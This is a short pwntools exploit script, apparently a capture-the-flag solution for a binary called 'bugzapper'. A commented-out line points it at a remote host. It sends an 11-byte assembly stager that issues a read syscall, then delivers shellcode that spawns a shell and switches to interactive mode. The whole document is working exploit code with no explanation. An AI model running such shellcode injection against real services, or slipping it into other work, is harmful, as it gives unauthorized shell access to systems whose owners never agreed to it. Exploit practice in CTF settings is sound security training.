from pwn import*
context(arch='amd64', os='linux', log_level='debug', terminal=['tmux', 'splitw', '-h'])
p = process('./bugzapper')
#p = remote('yuanshen.life', 34724)
p.recvuntil('you!\n')
#gdb.attach(p, 'b *0x4010C8\n')

sh = ''
sh += 'mov esi, eax;'
sh += 'pop rax;'
sh += 'pop rdx;'
sh += 'pop rax;'
sh += 'syscall;'
payload = asm(sh)
p.send(payload.ljust(11, b'a'))
sleep(1)
p.send(payload + asm(shellcraft.sh()))

p.interactive()
